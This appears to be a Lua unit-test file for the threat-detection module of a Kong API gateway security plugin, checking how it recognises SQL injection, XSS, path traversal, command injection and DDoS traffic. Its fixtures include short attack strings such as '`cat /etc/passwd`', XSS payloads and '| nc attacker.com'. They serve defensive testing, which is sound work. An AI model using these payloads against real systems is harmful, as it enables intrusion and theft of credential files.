-- Threat Detector Module Unit Tests
-- Tests for the extracted AI-powered threat detection functionality

local luaunit = require 'luaunit'

-- Mock dependencies
local mock_ngx = {
    shared = {
        kong_cache = {
            cache = {},
            get = function(self, key) return self.cache[key] end,
            set = function(self, key, value, ttl) self.cache[key] = value end,
            incr = function(self, key, value, init, ttl)
                self.cache[key] = (self.cache[key] or init or 0) + (value or 1)
                return self.cache[key]
            end
        }
    },
    now = function() return 1609459200 end, -- Fixed timestamp for testing
    md5 = function(s) return "mocked_md5_" .. #s end,
    log = {
        warn = function(...) end,
        err = function(...) end,
        info = function(...) end,
        debug = function(...) end
    }
}

local mock_kong = {
    request = {
        get_raw_query = function() return "param=value" end,
        get_path = function() return "/api/test" end
    }
}

-- Set up test environment
_G.ngx = mock_ngx
_G.kong = mock_kong

-- Require the module under test
local ThreatDetector = require "kong.plugins.kong-guard-ai.modules.ai.threat_detector"

TestThreatDetector = {}

function TestThreatDetector:setUp()
    -- Reset mock state before each test
    mock_ngx.shared.kong_cache.cache = {}
    self.detector = ThreatDetector.new({
        enable_threat_caching = true,
        threat_cache_ttl = 300
    })
end

function TestThreatDetector:test_new_initializes_correctly()
    local config = {
        enable_threat_caching = false,
        threat_cache_ttl = 600
    }

    local detector = ThreatDetector.new(config)

    luaunit.assertFalse(detector.enable_caching)
    luaunit.assertEquals(detector.cache_ttl, 600)
    luaunit.assertNotNil(detector.learning_data)
    luaunit.assertNotNil(detector.threat_cache)
end

function TestThreatDetector:test_new_uses_defaults()
    local detector = ThreatDetector.new()

    luaunit.assertTrue(detector.enable_caching)
    luaunit.assertEquals(detector.cache_ttl, 300)
end

function TestThreatDetector:test_detect_sql_injection_pattern()
    local patterns = {
        "union select * from users",
        "drop table accounts",
        "insert into admin",
        "delete from passwords",
        "1=1",
        "or 1=1"
    }

    for _, pattern in ipairs(patterns) do
        local result = self.detector:detect_sql_injection_pattern(pattern)
        luaunit.assertTrue(result, "Should detect SQL injection in: " .. pattern)
    end
end

function TestThreatDetector:test_detect_sql_injection_pattern_safe()
    local safe_patterns = {
        "normal query string",
        "select product from catalog",
        "union membership"
    }

    for _, pattern in ipairs(safe_patterns) do
        local result = self.detector:detect_sql_injection_pattern(pattern)
        luaunit.assertFalse(result, "Should not detect SQL injection in: " .. pattern)
    end
end

function TestThreatDetector:test_detect_xss_pattern()
    local patterns = {
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "onerror=alert(1)",
        "onload=malicious()",
        "onclick=hack()"
    }

    for _, pattern in ipairs(patterns) do
        local result = self.detector:detect_xss_pattern(pattern)
        luaunit.assertTrue(result, "Should detect XSS in: " .. pattern)
    end
end

function TestThreatDetector:test_detect_path_traversal_pattern()
    local patterns = {
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2f",
        "/etc/passwd",
        "/windows/system32"
    }

    for _, pattern in ipairs(patterns) do
        local result = self.detector:detect_path_traversal_pattern(pattern)
        luaunit.assertTrue(result, "Should detect path traversal in: " .. pattern)
    end
end

function TestThreatDetector:test_detect_command_injection_pattern()
    local patterns = {
        "$(whoami)",
        "`cat /etc/passwd`",
        "; ls /",
        "; cat sensitive",
        "| nc attacker.com"
    }

    for _, pattern in ipairs(patterns) do
        local result = self.detector:detect_command_injection_pattern(pattern)
        luaunit.assertTrue(result, "Should detect command injection in: " .. pattern)
    end
end

function TestThreatDetector:test_detect_patterns_optimized_sql()
    local features = {
        path = "/api/user",
        requests_per_minute = 10
    }

    -- Mock query with SQL injection
    mock_kong.request.get_raw_query = function() return "id=1 union select * from users" end

    local score, threat_type = self.detector:detect_patterns_optimized(features, {ddos_rpm_threshold = 100})

    luaunit.assertEquals(score, 0.95)
    luaunit.assertEquals(threat_type, "sql_injection")
end

function TestThreatDetector:test_detect_patterns_optimized_xss()
    local features = {
        path = "/search",
        requests_per_minute = 5
    }

    -- Mock query with XSS
    mock_kong.request.get_raw_query = function() return "q=<script>alert('xss')</script>" end

    local score, threat_type = self.detector:detect_patterns_optimized(features, {ddos_rpm_threshold = 100})

    luaunit.assertEquals(score, 0.9)
    luaunit.assertEquals(threat_type, "xss")
end

function TestThreatDetector:test_detect_patterns_optimized_ddos()
    local features = {
        path = "/api/endpoint",
        requests_per_minute = 150
    }

    mock_kong.request.get_raw_query = function() return "normal=query" end

    local score, threat_type = self.detector:detect_patterns_optimized(features, {ddos_rpm_threshold = 100})

    luaunit.assertEquals(score, 0.8)
    luaunit.assertEquals(threat_type, "ddos")
end

function TestThreatDetector:test_detect_patterns_optimized_safe()
    local features = {
        path = "/api/safe",
        requests_per_minute = 5
    }

    mock_kong.request.get_raw_query = function() return "safe=parameter" end

    local score, threat_type = self.detector:detect_patterns_optimized(features, {ddos_rpm_threshold = 100})

    luaunit.assertEquals(score, 0)
    luaunit.assertEquals(threat_type, "none")
end

function TestThreatDetector:test_apply_confidence_scoring_false_positive()
    local features = {client_ip = "192.168.1.100"}
    local pattern_key = "sql_injection:192.168.1.100"

    -- Mark as false positive
    self.detector.learning_data.false_positives[pattern_key] = true

    local score, details = self.detector:apply_confidence_scoring(0.8, "sql_injection", {}, features)

    luaunit.assertEquals(score, 0.4) -- Should be halved
    luaunit.assertTrue(details.confidence_adjusted)
    luaunit.assertEquals(details.adjustment_reason, "known_false_positive")
end

function TestThreatDetector:test_apply_confidence_scoring_adjustment()
    local features = {client_ip = "192.168.1.100"}

    -- Set confidence adjustment for threat type
    self.detector.learning_data.confidence_adjustments["xss"] = 0.7

    local score, details = self.detector:apply_confidence_scoring(0.9, "xss", {}, features)

    luaunit.assertEquals(score, 0.63) -- 0.9 * 0.7
    luaunit.assertTrue(details.confidence_adjusted)
    luaunit.assertEquals(details.adjustment_factor, 0.7)
end

function TestThreatDetector:test_track_pattern()
    local features = {client_ip = "192.168.1.100"}

    self.detector:track_pattern("sql_injection", features, 0.8)

    local pattern_key = "sql_injection:192.168.1.100"
    local pattern = self.detector.learning_data.pattern_history[pattern_key]

    luaunit.assertNotNil(pattern)
    luaunit.assertEquals(pattern.count, 1)
    luaunit.assertEquals(pattern.total_score, 0.8)
    luaunit.assertEquals(pattern.avg_score, 0.8)
end

function TestThreatDetector:test_learn_from_feedback_false_positive()
    local threat_data = {
        type = "xss",
        client_ip = "192.168.1.100",
        score = 0.9
    }
    local feedback = {false_positive = true}

    self.detector:learn_from_feedback(threat_data, feedback)

    local pattern_key = "xss:192.168.1.100"
    luaunit.assertTrue(self.detector.learning_data.false_positives[pattern_key])
    luaunit.assertEquals(self.detector.learning_data.confidence_adjustments["xss"], 0.9)
end

function TestThreatDetector:test_learn_from_feedback_confirmed_threat()
    local threat_data = {
        type = "sql_injection",
        client_ip = "192.168.1.200",
        score = 0.8
    }
    local feedback = {confirmed_threat = true}

    self.detector:learn_from_feedback(threat_data, feedback)

    luaunit.assertEquals(self.detector.learning_data.confidence_adjustments["sql_injection"], 1.1)
end

function TestThreatDetector:test_generate_threat_cache_key()
    local features = {
        method = "POST",
        path = "/api/login",
        client_ip = "192.168.1.100",
        requests_per_minute = 5
    }

    local key = self.detector:generate_threat_cache_key(features)

    luaunit.assertNotNil(key)
    luaunit.assertTrue(#key > 0)
end

function TestThreatDetector:test_clear_cache()
    self.detector.threat_cache["test_key"] = {data = "test"}

    self.detector:clear_cache()

    luaunit.assertEquals(next(self.detector.threat_cache), nil)
end

function TestThreatDetector:test_get_statistics()
    -- Add some test data
    self.detector.threat_cache["key1"] = {data = "test1"}
    self.detector.threat_cache["key2"] = {data = "test2"}
    self.detector.learning_data.false_positives["fp1"] = true
    self.detector.learning_data.confirmed_threats["ct1"] = {score = 0.8}
    self.detector.learning_data.confidence_adjustments["xss"] = 0.9
    self.detector.learning_data.pattern_history["pattern1"] = {count = 5}

    local stats = self.detector:get_statistics()

    luaunit.assertEquals(stats.cache_size, 2)
    luaunit.assertEquals(stats.false_positives, 1)
    luaunit.assertEquals(stats.confirmed_threats, 1)
    luaunit.assertEquals(stats.confidence_adjustments, 1)
    luaunit.assertEquals(stats.pattern_history, 1)
end

function TestThreatDetector:test_export_learning_data()
    -- Add some test learning data
    self.detector.learning_data.false_positives["test"] = true
    self.detector.learning_data.confirmed_threats["test2"] = {score = 0.7}

    local exported = self.detector:export_learning_data()

    luaunit.assertNotNil(exported.false_positives)
    luaunit.assertNotNil(exported.confirmed_threats)
    luaunit.assertNotNil(exported.confidence_adjustments)
    luaunit.assertNotNil(exported.pattern_history)
    luaunit.assertNotNil(exported.export_timestamp)
end

function TestThreatDetector:test_import_learning_data()
    local data = {
        false_positives = {test_fp = true},
        confirmed_threats = {test_ct = {score = 0.8}},
        confidence_adjustments = {xss = 0.9},
        pattern_history = {test_pattern = {count = 3}}
    }

    local success = self.detector:import_learning_data(data)

    luaunit.assertTrue(success)
    luaunit.assertTrue(self.detector.learning_data.false_positives.test_fp)
    luaunit.assertNotNil(self.detector.learning_data.confirmed_threats.test_ct)
    luaunit.assertEquals(self.detector.learning_data.confidence_adjustments.xss, 0.9)
end

function TestThreatDetector:test_import_learning_data_invalid()
    local success = self.detector:import_learning_data(nil)

    luaunit.assertFalse(success)
end

function TestThreatDetector:test_cleanup_old_entries()
    -- Add cache entry with old timestamp
    local old_time = 1609459200 - 1000
    self.detector.threat_cache["old_key"] = {timestamp = old_time}
    self.detector.threat_cache["new_key"] = {timestamp = 1609459200}

    -- Add pattern with old timestamp
    self.detector.learning_data.pattern_history["old_pattern"] = {
        last_seen = old_time
    }
    self.detector.learning_data.pattern_history["new_pattern"] = {
        last_seen = 1609459200
    }

    self.detector:cleanup_old_entries()

    -- Old entries should be removed, new ones should remain
    luaunit.assertNil(self.detector.threat_cache["old_key"])
    luaunit.assertNotNil(self.detector.threat_cache["new_key"])
    luaunit.assertNil(self.detector.learning_data.pattern_history["old_pattern"])
    luaunit.assertNotNil(self.detector.learning_data.pattern_history["new_pattern"])
end

function TestThreatDetector:test_configure()
    local new_config = {
        enable_threat_caching = false,
        threat_cache_ttl = 600
    }

    self.detector:configure(new_config)

    luaunit.assertFalse(self.detector.enable_caching)
    luaunit.assertEquals(self.detector.cache_ttl, 600)
end

-- Run the tests
os.exit(luaunit.LuaUnit.run())
